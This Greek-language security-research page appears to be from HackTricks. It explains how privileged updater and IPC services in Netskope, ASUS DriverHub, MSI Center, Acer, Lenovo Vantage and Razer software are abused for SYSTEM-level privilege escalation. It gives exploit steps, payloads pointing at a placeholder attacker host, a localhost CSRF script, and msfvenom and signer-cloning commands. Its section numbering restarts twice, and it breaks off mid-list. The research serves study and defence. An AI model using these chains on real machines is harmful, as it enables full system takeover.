# Κατάχρηση Enterprise Auto-Updaters και Privileged IPC (π.χ., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα γενικεύει μια κατηγορία αλυσίδων τοπικής κλιμάκωσης προνομίων στα Windows, που εντοπίζονται σε enterprise endpoint agents και updaters τα οποία εκθέτουν μια εύκολα προσβάσιμη επιφάνεια IPC και μια privileged διαδικασία ενημέρωσης. Αντιπροσωπευτικό παράδειγμα είναι το Netskope Client για Windows < R129 (CVE-2025-0309), όπου ένας χρήστης με χαμηλά προνόμια μπορεί να εξαναγκάσει την εγγραφή σε server που ελέγχεται από επιτιθέμενο και, στη συνέχεια, να παραδώσει ένα κακόβουλο MSI το οποίο εγκαθιστά η υπηρεσία SYSTEM.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Βασικές ιδέες που μπορείτε να αξιοποιήσετε σε παρόμοια προϊόντα:
- Καταχραστείτε το localhost IPC μιας privileged υπηρεσίας για να εξαναγκάσετε επανεγγραφή ή αναδιαμόρφωση προς server επιτιθέμενου.
- Υλοποιήστε τα update endpoints του vendor, παραδώστε ένα rogue Trusted Root CA και κατευθύνετε τον updater σε ένα κακόβουλο, «signed» πακέτο.
- Παρακάμψτε αδύναμους ελέγχους signer (allow-lists βάσει CN), προαιρετικά digest flags και χαλαρές ιδιότητες MSI.
- Αν το IPC είναι «encrypted», παράγετε το key/IV από machine identifiers που είναι αποθηκευμένα στο registry και είναι αναγνώσιμα από όλους.
- Αν η υπηρεσία περιορίζει τους callers βάσει image path/process name, κάντε inject σε μια allow-listed διεργασία ή εκκινήστε μία σε suspended κατάσταση και αρχικοποιήστε τη DLL σας μέσω μιας ελάχιστης τροποποίησης του thread context.

Οι custom τοπικές υπηρεσίες TCP απαιτούν τον ίδιο έλεγχο ταυτότητας και ορίων εισόδου, ακόμη κι όταν απαιτούν PIN ή άλλα credentials της εφαρμογής. Αντιστοιχίστε τον listener στη διεργασία του και στον effective λογαριασμό υπηρεσίας και, στη συνέχεια, ελέγξτε το ακριβές deployed binary/version και αν τα πεδία που ελέγχει ο caller ελέγχονται ως προς το μήκος τους πριν αντιγραφούν σε fixed buffers ή χρησιμοποιηθούν για τη δημιουργία εντολής child process. Οι [οδηγίες της Microsoft για buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) εξηγούν γιατί οι μη ελεγμένες εξωτερικές είσοδοι είναι επικίνδυνες σε privileged native code. Ένας loopback listener, hardcoded credential ή process name από μόνος του δεν τεκμηριώνει αλλοίωση μνήμης ή εκτέλεση ως SYSTEM· η δυνατότητα πρόσβασης, η εξουσιοδότηση, η διαδρομή εκτέλεσης και τα mitigations παραμένουν ξεχωριστές προϋποθέσεις. Περιορίστε τη συνήθη απαρίθμηση σε παθητικές ενέργειες αντί να στέλνετε σε ενεργή υπηρεσία εισόδους με μήκος που προκαλεί crash.

---
## 1) Εξαναγκασμός εγγραφής σε server επιτιθέμενου μέσω localhost IPC

Πολλοί agents διαθέτουν μια user-mode διεργασία UI που επικοινωνεί με μια υπηρεσία SYSTEM μέσω localhost TCP χρησιμοποιώντας JSON.

Παρατηρήθηκε στο Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ροή exploit:
1) Δημιουργήστε ένα JWT enrollment token του οποίου τα claims καθορίζουν τον backend host (π.χ., AddonUrl). Χρησιμοποιήστε alg=None, ώστε να μην απαιτείται υπογραφή.
2) Στείλτε το IPC message που καλεί την εντολή provisioning με το JWT και το όνομα του tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Η υπηρεσία αρχίζει να στέλνει αιτήματα στον κακόβουλο server σου για εγγραφή/διαμόρφωση, π.χ.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Σημειώσεις:
- Αν η επαλήθευση του caller βασίζεται στη διαδρομή/το όνομα, ξεκίνα το αίτημα από ένα allow-listed vendor binary (βλ. §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC διαχείρισης εκτεθειμένο στο δίκτυο

Αυτό το όριο εμπιστοσύνης δεν περιορίζεται πάντα στο localhost. Στην αναφερθείσα περίπτωση του MyReport Updater 2.1.1, μια υπηρεσία `LocalSystem` άκουγε σε όλες τις διεπαφές και δεχόταν μη αυθεντικοποιημένη αλλαγή διαμόρφωσης gRPC για τον host αναφοράς, τη θύρα και τον τρόπο λειτουργίας. Για την απομακρυσμένη παραλλαγή απαιτούνταν τόσο πρόσβαση μέσω δικτύου στον listener όσο και εξερχόμενη πρόσβαση από την υπηρεσία προς την επιλεγμένη αναφορά. Αξιολόγησε αυτά τα δύο ξεχωριστά από το αν η μεταγενέστερη ροή πακέτου μπορεί να παραβιάσει το όριο εγγραφής αρχείων.<sup>[[16]](#references)</sup>

---
## 2) Υφαρπαγή του καναλιού ενημέρωσης για εκτέλεση κώδικα ως SYSTEM

Μόλις ο client επικοινωνήσει με τον server σου, υλοποίησε τα αναμενόμενα endpoints και κατεύθυνέ τον σε ένα MSI του επιτιθέμενου. Τυπική ακολουθία:

1) /v2/config/org/clientconfig → Επέστρεψε JSON config με πολύ μικρό διάστημα ενημέρωσης, π.χ.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Επιστρέφει ένα πιστοποιητικό CA σε μορφή PEM. Η υπηρεσία το εγκαθιστά στο store Trusted Root του Local Machine.
3) /v2/checkupdate → Παρέχετε metadata που παραπέμπουν σε ένα κακόβουλο MSI και μια πλαστή έκδοση.

Παράκαμψη συνηθισμένων ελέγχων που συναντώνται στην πράξη:
- Allow-list για το CN του signer: η υπηρεσία μπορεί να ελέγχει μόνο αν το Subject CN είναι ίσο με “netSkope Inc” ή “Netskope, Inc.”. Η rogue CA σας μπορεί να εκδώσει ένα leaf με αυτό το CN και να υπογράψει το MSI.
- Ιδιότητα CERT_DIGEST: συμπεριλάβετε μια ακίνδυνη ιδιότητα MSI με όνομα CERT_DIGEST. Δεν επιβάλλεται έλεγχος κατά την εγκατάσταση.
- Προαιρετική επιβολή digest: μια σημαία ρύθμισης (π.χ. check_msi_digest=false) απενεργοποιεί την πρόσθετη κρυπτογραφική επικύρωση.

Αποτέλεσμα: η υπηρεσία SYSTEM εγκαθιστά το MSI από
C:\ProgramData\Netskope\stAgent\data\*.msi
και εκτελεί αυθαίρετο κώδικα ως NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Δίδαγμα από την παράκαμψη ενημερώσεων κώδικα: αν ένας vendor απαντήσει προσθέτοντας σε allow-list έναν μικρό αριθμό «έμπιστων» domains αντί να αυθεντικοποιήσει κρυπτογραφικά την πηγή της ενημέρωσης, αναζητήστε redirectors ή reverse proxies που ανήκουν στον vendor και εξακολουθούν να σας επιτρέπουν να κατευθύνετε την κίνηση. Στην περίπτωση της Netskope, μεταγενέστερη δημόσια έρευνα έδειξε ότι μια allow-list της εποχής R129 μπορούσε και πάλι να γίνει αντικείμενο εκμετάλλευσης μέσω του `rproxy.goskope.com`, το οποίο προωθούσε περιεχόμενο Azure App Service ελεγχόμενο από τον επιτιθέμενο. Αντιμετωπίστε τις allow-lists ονομάτων host ως μικρό εμπόδιο, όχι ως όριο εμπιστοσύνης.<sup>[[14]](#references)</sup>

Ένας άλλος τρόπος αποτυχίας είναι τα **αυτοσυνεπή αλλά μη αυθεντικοποιημένα metadata πακέτου**. Στην περίπτωση του MyReport, μια αναφορά ελεγχόμενη από τον επιτιθέμενο παρείχε ένα τροποποιημένο αρχείο, ενώ ένας ενδιάμεσος άλλαζε τις αποκρίσεις MD5 digest και μεγέθους του vendor πριν φτάσουν στο updater. Η αντιστοίχιση αυτών των τιμών έλεγχε τη συνέπεια των αποκρίσεων, όχι την προέλευσή τους από τον vendor· δεν χρειαζόταν σύγκρουση MD5. Ένας κατάλογος εγκατάστασης που επιλεγόταν από τον caller μετέτρεπε έπειτα την προνομιακή αποσυμπίεση σε όριο εγγραφής αρχείων. Το primitive φόρτωσης DLL που προκύπτει καλύπτεται στην ενότητα [αλυσίδωση αυθαίρετης εγγραφής αρχείου σε DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Πλαστογράφηση κρυπτογραφημένων αιτημάτων IPC (όταν υπάρχουν)

Από την έκδοση R127, η Netskope περιέβαλλε το IPC JSON σε ένα πεδίο encryptData που μοιάζει με Base64. Η αντίστροφη ανάλυση αποκάλυψε AES με key/IV που προκύπτουν από τιμές μητρώου αναγνώσιμες από οποιονδήποτε χρήστη:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Οι επιτιθέμενοι μπορούν να αναπαράγουν την κρυπτογράφηση και να στείλουν έγκυρες κρυπτογραφημένες εντολές από έναν τυπικό χρήστη.<sup>[[1]](#references)[[2]](#references)</sup> Γενική συμβουλή: αν ένας agent αρχίσει ξαφνικά να «κρυπτογραφεί» το IPC του, αναζητήστε device IDs, product GUIDs και install IDs κάτω από το HKLM που μπορεί να χρησιμοποιούνται ως υλικό κρυπτογράφησης.

---
## 4) Παράκαμψη allow-lists των callers IPC (έλεγχοι διαδρομής/ονόματος)

Ορισμένες υπηρεσίες προσπαθούν να αυθεντικοποιήσουν τον peer εντοπίζοντας το PID της σύνδεσης TCP και συγκρίνοντας τη διαδρομή/το όνομα του image με allow-listed εκτελέσιμα αρχεία του vendor που βρίσκονται κάτω από το Program Files (π.χ. stagentui.exe, bwansvc.exe, epdlp.exe).

Δύο πρακτικοί τρόποι παράκαμψης:
- DLL injection σε μια allow-listed διεργασία (π.χ. nsdiag.exe) και προώθηση των αιτημάτων IPC από μέσα της.
- Εκκίνηση ενός allow-listed binary σε αναστολή και φόρτωση του proxy DLL μέσω bootstrap χωρίς CreateRemoteThread (βλ. §5), ώστε να ικανοποιούνται οι κανόνες tamper protection που επιβάλλει ο driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection συμβατό με tamper protection: suspended process + NtContinue patch

Τα προϊόντα συχνά περιλαμβάνουν driver minifilter/OB callbacks (π.χ. Stadrv) για να αφαιρούν επικίνδυνα δικαιώματα από handles προς προστατευμένες διεργασίες:
- Διεργασία: αφαιρεί τα PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: περιορίζει τα δικαιώματα σε THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Ένας αξιόπιστος loader σε user mode που συμμορφώνεται με αυτούς τους περιορισμούς:
1) Δημιουργήστε μια διεργασία vendor binary με CREATE_SUSPENDED.
2) Αποκτήστε handles για όσα δικαιώματα εξακολουθείτε να έχετε: PROCESS_VM_WRITE | PROCESS_VM_OPERATION στη διεργασία και ένα handle thread με THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ή μόνο THREAD_RESUME αν κάνετε patch τον κώδικα σε γνωστό RIP).
3) Αντικαταστήστε το ntdll!NtContinue (ή άλλο πρώιμο thunk που είναι βέβαιο ότι έχει αντιστοιχιστεί) με ένα μικρό stub που καλεί το LoadLibraryW με τη διαδρομή του DLL σας και μετά επιστρέφει.
4) Καλέστε ResumeThread για να εκτελεστεί το stub μέσα στη διεργασία και να φορτώσει το DLL σας.

Επειδή δεν χρησιμοποιήσατε PROCESS_CREATE_THREAD ή PROCESS_SUSPEND_RESUME σε ήδη προστατευμένη διεργασία (τη δημιουργήσατε εσείς), η πολιτική του driver τηρείται.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Πρακτικά εργαλεία
- Το NachoVPN (plugin της Netskope) αυτοματοποιεί τη δημιουργία rogue CA, την υπογραφή κακόβουλου MSI και την παροχή των απαιτούμενων endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- Το UpSkope είναι ένας custom client IPC που δημιουργεί αυθαίρετα μηνύματα IPC (προαιρετικά κρυπτογραφημένα με AES) και περιλαμβάνει injection suspended process, ώστε τα μηνύματα να προέρχονται από ένα allow-listed binary.<sup>[[4]](#references)</sup>

## 7) Γρήγορη ροή εργασίας για αρχική διαλογή άγνωστων επιφανειών updater/IPC

Όταν εξετάζετε έναν νέο endpoint agent ή μια σουίτα «βοηθητικών» εργαλείων μητρικής, μια γρήγορη ροή εργασίας συνήθως αρκεί για να διαπιστώσετε αν έχετε μπροστά σας έναν υποσχόμενο στόχο privesc:<sup>[[6]](#references)</sup>

1) Καταγράψτε τους listeners loopback και αντιστοιχίστε τους στις διεργασίες του vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Καταγράψτε τους πιθανούς named pipes:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Συλλέξτε δεδομένα δρομολόγησης από το registry που χρησιμοποιούνται από IPC servers βασισμένους σε plugins:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Εξαγάγετε πρώτα τα ονόματα των endpoints, τα JSON keys και τα command IDs από τον client σε user mode. Τα packed Electron/.NET frontends συχνά leak το πλήρες schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Εντοπίστε το πραγματικό κατηγόρημα εμπιστοσύνης, όχι απλώς τη διαδρομή κώδικα που τελικά εκκινεί τη διεργασία:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Μοτίβα στα οποία αξίζει να δοθεί προτεραιότητα:
- Η χρήση των `CryptQueryObject`/certificate parsing χωρίς `WinVerifyTrust` συνήθως σημαίνει ότι το «υπάρχει πιστοποιητικό» θεωρήθηκε ισοδύναμο με το «το πιστοποιητικό είναι έμπιστο», επιτρέποντας cloning πιστοποιητικών ή άλλα κόλπα με πλαστούς υπογράφοντες.
- Οι έλεγχοι υποσυμβολοσειράς/κατάληξης στα `Origin`, `Referer`, στις διευθύνσεις URL λήψης, στα ονόματα διεργασιών ή στα CN των υπογραφόντων δεν αποτελούν authentication. Το `contains(".vendor.com")` είναι συνήθως εκμεταλλεύσιμο με domains-μιμητές που ελέγχονται από τον επιτιθέμενο.
- Αν το GUI με χαμηλά δικαιώματα αποφασίζει ότι «το αρχείο είναι έμπιστο» και ο SYSTEM broker απλώς καταναλώνει αυτό το αποτέλεσμα, η τροποποίηση ή επανυλοποίηση του DLL/JS στην πλευρά του client συχνά παρακάμπτει πλήρως το όριο ασφαλείας (split validation τύπου Razer).
- Αν ο broker αντιγράφει ένα payload στο `%TEMP%`/`C:\Windows\Temp` και στη συνέχεια το επικυρώνει ή προγραμματίζει την εκτέλεσή του από αυτήν τη διαδρομή, ελέγξτε αμέσως για παράθυρα αντικατάστασης TOCTOU και για sibling plugin modules που εκθέτουν εναλλακτικά wrappers `ExecuteTask()` με ασθενέστερους ελέγχους.<sup>[[6]](#references)</sup>

Για στόχους με πολλά named pipes, το PipeViewer είναι ένας γρήγορος τρόπος να εντοπίσετε αδύναμα DACL και pipes προσβάσιμα εξ αποστάσεως πριν αρχίσετε να κάνετε reverse engineering του πρωτοκόλλου σε βάθος.<sup>[[11]](#references)</sup>

Αν ο στόχος αυθεντικοποιεί τους callers μόνο βάσει PID, διαδρομής image ή ονόματος διεργασίας, θεωρήστε το εμπόδιο μικρής δυσκολίας και όχι όριο ασφαλείας: η έγχυση κώδικα στον νόμιμο client ή η σύνδεση από διεργασία που βρίσκεται στη λίστα επιτρεπόμενων συχνά αρκεί για να ικανοποιηθούν οι έλεγχοι του server. Ειδικά για named pipes, [αυτή η σελίδα σχετικά με το client impersonation και την κατάχρηση pipe](named-pipe-client-impersonation.md) καλύπτει την τεχνική σε μεγαλύτερο βάθος.

Για έναν **broker εκκαθάρισης ή επαναφοράς** με αυξημένα δικαιώματα, εξετάστε το όριο εμπιστοσύνης των διαδρομών, καθώς και το ACL του pipe. Ένας caller με χαμηλότερα δικαιώματα ενδέχεται να μπορεί να επιλέξει προορισμό επαναφοράς ή να μετονομάσει ένα προσωρινά αποθηκευμένο αντίγραφο ασφαλείας σε κοινόχρηστο κατάλογο, ακόμη κι όταν το εκτελέσιμο της υπηρεσίας και ο κατάλογος εγκατάστασής της είναι προστατευμένα. Επιβεβαιώστε ξεχωριστά ότι ο caller μπορεί να καλέσει την εντολή επαναφοράς, να τροποποιήσει το συγκεκριμένο προσωρινά αποθηκευμένο αρχείο εισόδου ή το όνομα αρχείου, ότι ο broker εκτελείται με υψηλότερη ταυτότητα και ότι η λειτουργία επαναφοράς του γράφει πράγματι στην επιλεγμένη προστατευμένη διαδρομή. Ένας εγγράψιμος κατάλογος προσωρινής αποθήκευσης ή ένα αναγνώσιμο pipe από μόνο του δεν αποδεικνύει δυνατότητα αυθαίρετης εγγραφής με αυξημένα δικαιώματα· η αντιστοίχιση προορισμού και η συμπεριφορά της υπηρεσίας χρειάζονται ανασκόπηση κώδικα ή ελεγχόμενες δοκιμές. Μην εκτελείτε άγνωστη εντολή εκκαθάρισης κατά την παθητική αναγνώριση, καθώς μπορεί να διαγράψει αρχεία χρηστών.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (μοτίβο Lenovo Vantage)

Μια νεότερη παραλλαγή που αξίζει να αναζητήσετε είναι ο **signed-client RPC broker**: μια επιτραπέζια διεργασία Lenovo-signed με χαμηλά δικαιώματα επικοινωνεί με μια υπηρεσία SYSTEM, και η υπηρεσία δρομολογεί εντολές JSON σε ένα σύνολο add-ins που περιγράφονται σε XML, κάτω από το `%ProgramData%`. Μόλις επιτευχθεί εκτέλεση κώδικα **μέσα σε οποιονδήποτε αποδεκτό signed client**, κάθε contract με `runas="system"` γίνεται μέρος της επιφάνειας επίθεσης.<sup>[[15]](#references)</sup>

Πολύτιμες primitives που παρατηρήθηκαν σε έρευνα για το Lenovo Vantage:
- **Εμπιστοσύνη στον caller επειδή έχει υπογραφή του vendor**: οι ερευνητές απέκτησαν πρόσβαση σε αυθεντικοποιημένο context αντιγράφοντας ένα Lenovo-signed EXE σε εγγράψιμο κατάλογο και ικανοποιώντας ένα DLL side-load (`profapi.dll`), ώστε να εκτελεστεί αυθαίρετος κώδικας μέσα σε client που η υπηρεσία ήδη εμπιστευόταν.
- **Ανακάλυψη επιφάνειας επίθεσης μέσω manifest**: τα add-ins δηλώνονται στο `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`· αρκετά contracts εκτελούνται ως `SYSTEM`, επομένως η απαρίθμηση αυτών των manifests συχνά αποκαλύπτει τα πραγματικά προνομιούχα verbs ταχύτερα από το reverse engineering του ίδιου του broker.
- **Bugs ανά εντολή πίσω από το αυθεντικοποιημένο κανάλι**: αφού αποκτήθηκε πρόσβαση στον έμπιστο client, δημόσια έρευνα εντόπισε path-traversal και race conditions σε verbs ενημέρωσης/εγκατάστασης, κατάχρηση raw SQL σε βάσεις δεδομένων προνομιούχων ρυθμίσεων και ελέγχους διαδρομών μητρώου βάσει υποσυμβολοσειράς, οι οποίοι επέτρεπαν εγγραφές εκτός του προβλεπόμενου hive.

Χρήσιμη αναγνώριση σε έναν στόχο:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Πρακτικό συμπέρασμα: κάθε φορά που μια βοηθητική σουίτα εκθέτει έναν broker που πρώτα πιστοποιεί την **caller process** και μόνο έπειτα δρομολογεί δεκάδες εντολές plugin/add-in, μην σταματάς αφού παρακάμψεις τον αρχικό έλεγχο εμπιστοσύνης. Κάνε dump τον πίνακα manifest/contract και κάνε fuzzing σε κάθε verb υψηλών προνομίων ξεχωριστά· το πιστοποιημένο κανάλι συνήθως κρύβει αρκετά σφάλματα δεύτερου σταδίου.

---
## 1) CSRF από browser προς localhost εναντίον προνομιούχων HTTP API (ASUS DriverHub)

Το DriverHub εγκαθιστά μια HTTP υπηρεσία σε user-mode (ADU.exe) στη διεύθυνση 127.0.0.1:53000, η οποία αναμένει κλήσεις browser από το https://driverhub.asus.com. Το φίλτρο origin απλώς εκτελεί `string_contains(".asus.com")` πάνω στην κεφαλίδα Origin και στα URL λήψης που εκτίθενται από το `/asus/v1.0/*`. Επομένως, οποιοσδήποτε host ελέγχεται από επιτιθέμενο και περιέχει το `.asus.com`, όπως το `https://driverhub.asus.com.attacker.tld`, περνά τον έλεγχο και μπορεί να εκδώσει αιτήματα που αλλάζουν την κατάσταση μέσω JavaScript.<sup>[[6]](#references)</sup> Δες τα [βασικά του CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) για πρόσθετα μοτίβα παράκαμψης.

Πρακτική ροή:
1) Κατοχύρωσε ένα domain που περιέχει το `.asus.com` και φιλοξένησε εκεί μια κακόβουλη ιστοσελίδα.
2) Χρησιμοποίησε `fetch` ή XHR για να καλέσεις ένα προνομιούχο endpoint (π.χ., `Reboot`, `UpdateApp`) στο `http://127.0.0.1:53000`.
3) Στείλε το JSON body που αναμένει ο handler – το packed frontend JS εμφανίζει το παρακάτω schema.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Ακόμα και το PowerShell CLI που φαίνεται παρακάτω πετυχαίνει όταν το Origin header πλαστογραφείται ώστε να έχει την έμπιστη τιμή:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Οποιαδήποτε επίσκεψη σε site του attacker μέσω browser γίνεται επομένως ένα local CSRF με 1 click (ή 0 clicks μέσω `onload`) που ενεργοποιεί έναν SYSTEM helper.

---
## 2) Μη ασφαλής επαλήθευση code-signing και κλωνοποίηση πιστοποιητικού (ASUS UpdateApp)

Το `/asus/v1.0/UpdateApp` κατεβάζει αυθαίρετα εκτελέσιμα που ορίζονται στο JSON body και τα αποθηκεύει προσωρινά στο `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Η επικύρωση του URL λήψης επαναχρησιμοποιεί την ίδια λογική substring, οπότε γίνεται αποδεκτό το `http://updates.asus.com.attacker.tld:8000/payload.exe`. Μετά τη λήψη, το ADU.exe απλώς ελέγχει ότι το PE περιέχει υπογραφή και ότι το Subject string αντιστοιχεί στην ASUS πριν το εκτελέσει — δεν χρησιμοποιεί `WinVerifyTrust` ούτε επικύρωση αλυσίδας πιστοποιητικών.

Για να weaponize το flow:
1) Δημιουργήστε ένα payload (π.χ., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Κλωνοποιήστε τον signer της ASUS σε αυτό (π.χ., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Φιλοξενήστε το `pwn.exe` σε ένα lookalike domain `.asus.com` και ενεργοποιήστε το UpdateApp μέσω του browser CSRF παραπάνω.

Επειδή τόσο τα φίλτρα Origin και URL βασίζονται σε substring και ο έλεγχος signer συγκρίνει μόνο strings, το DriverHub κατεβάζει και εκτελεί το binary του attacker στο elevated context του.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU σε διαδρομές αντιγραφής/εκτέλεσης του updater (MSI Center CMD_AutoUpdateSDK)

Η SYSTEM service του MSI Center εκθέτει ένα TCP protocol όπου κάθε frame είναι `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Το core component (Component ID `0f 27 00 00`) περιλαμβάνει το `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Ο handler του:
1) Αντιγράφει το παρεχόμενο εκτελέσιμο στο `C:\Windows\Temp\MSI Center SDK.exe`.
2) Επαληθεύει την υπογραφή μέσω του `CS_CommonAPI.EX_CA::Verify` (το subject του πιστοποιητικού πρέπει να ισούται με “MICRO-STAR INTERNATIONAL CO., LTD.” και το `WinVerifyTrust` να επιτύχει).
3) Δημιουργεί scheduled task που εκτελεί το προσωρινό αρχείο ως SYSTEM με arguments που ελέγχει ο attacker.

Το αντιγραμμένο αρχείο δεν κλειδώνεται μεταξύ της επαλήθευσης και της `ExecuteTask()`. Ένας attacker μπορεί να:
- Στείλει το Frame A με ένα νόμιμο MSI-signed binary (εξασφαλίζει ότι ο έλεγχος υπογραφής θα περάσει και ότι το task θα μπει στην ουρά).
- Το συγχρονίσει με επαναλαμβανόμενα μηνύματα Frame B που δείχνουν σε ένα κακόβουλο payload και αντικαθιστούν το `MSI Center SDK.exe` αμέσως μετά την ολοκλήρωση της επαλήθευσης.

Όταν ενεργοποιηθεί ο scheduler, εκτελεί το overwritten payload ως SYSTEM, παρότι είχε επικυρώσει το αρχικό αρχείο. Η αξιόπιστη εκμετάλλευση χρησιμοποιεί δύο goroutines/threads που στέλνουν συνεχώς το CMD_AutoUpdateSDK μέχρι να κερδηθεί το TOCTOU window.<sup>[[6]](#references)</sup>

---
## 2) Κατάχρηση custom SYSTEM-level IPC και impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Κάθε plugin/DLL που φορτώνεται από το `MSI.CentralServer.exe` λαμβάνει ένα Component ID αποθηκευμένο στο `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Τα πρώτα 4 bytes ενός frame επιλέγουν αυτό το component, επιτρέποντας στους attackers να δρομολογούν commands σε αυθαίρετα modules.
- Τα plugins μπορούν να ορίζουν τους δικούς τους task runners. Το `Support\API_Support.dll` εκθέτει το `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` και καλεί απευθείας το `API_Support.EX_Task::ExecuteTask()` **χωρίς επικύρωση υπογραφής** — οποιοσδήποτε local user μπορεί να το κατευθύνει στο `C:\Users\<user>\Desktop\payload.exe` και να αποκτήσει SYSTEM execution με βεβαιότητα.
- Η παρακολούθηση του loopback με Wireshark ή η ανάλυση των .NET binaries στο dnSpy αποκαλύπτει γρήγορα την αντιστοίχιση Component ↔ command· έπειτα, custom Go/ Python clients μπορούν να αναπαράγουν τα frames.<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes και επίπεδα impersonation
- Το `ACCSvc.exe` (SYSTEM) εκθέτει το `\\.\pipe\treadstone_service_LightMode`, και το discretionary ACL του επιτρέπει remote clients (π.χ., `\\TARGET\pipe\treadstone_service_LightMode`). Η αποστολή του command ID `7` μαζί με ένα file path καλεί τη ρουτίνα του service για δημιουργία διεργασίας.
- Η client library σειριοποιεί ένα magic terminator byte (113) μαζί με τα args. Η δυναμική ανάλυση με Frida/`TsDotNetLib` (δείτε το [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) για συμβουλές instrumentation) δείχνει ότι ο native handler αντιστοιχίζει αυτή την τιμή σε ένα `SECURITY_IMPERSONATION_LEVEL` και integrity SID πριν καλέσει το `CreateProcessAsUser`.
- Αντικαθιστώντας το 113 (`0x71`) με 114 (`0x72`), η εκτέλεση περνά στο generic branch, το οποίο διατηρεί το πλήρες SYSTEM token και ορίζει ένα high-integrity SID (`S-1-16-12288`). Επομένως, το binary που δημιουργείται εκτελείται ως unrestricted SYSTEM, τόσο τοπικά όσο και μεταξύ μηχανημάτων.
- Συνδυάστε το με το εκτεθειμένο installer flag (`Setup.exe -nocheck`) για να εγκαταστήσετε το ACC ακόμη και σε lab VMs και να δοκιμάσετε το pipe χωρίς hardware του vendor.<sup>[[6]](#references)</sup>

Αυτά τα IPC bugs δείχνουν γιατί οι localhost services πρέπει να επιβάλλουν mutual authentication (ALPC SIDs, φίλτρα `ImpersonationLevel=Impersonation`, token filtering) και γιατί ο “run arbitrary binary” helper κάθε module πρέπει να χρησιμοποιεί τους ίδιους ελέγχους signer.

---
## 3) COM/IPC “elevator” helpers με αδύναμη επικύρωση σε user mode (Razer Synapse 4)

Το Razer Synapse 4 πρόσθεσε ένα ακόμη χρήσιμο μοτίβο σε αυτή την κατηγορία: ένας χρήστης με χαμηλά δικαιώματα μπορεί να ζητήσει από ένα COM helper να εκκινήσει μια διεργασία μέσω του `RzUtility.Elevator`, ενώ η απόφαση εμπιστοσύνης ανατίθεται σε ένα user-mode DLL (`simple_service.dll`), αντί να επιβάλλεται ισχυρά εντός του privileged boundary.

Παρατηρημένη διαδρομή εκμετάλλευσης:
- Δημιουργήστε ένα instance του COM object `RzUtility.Elevator`.
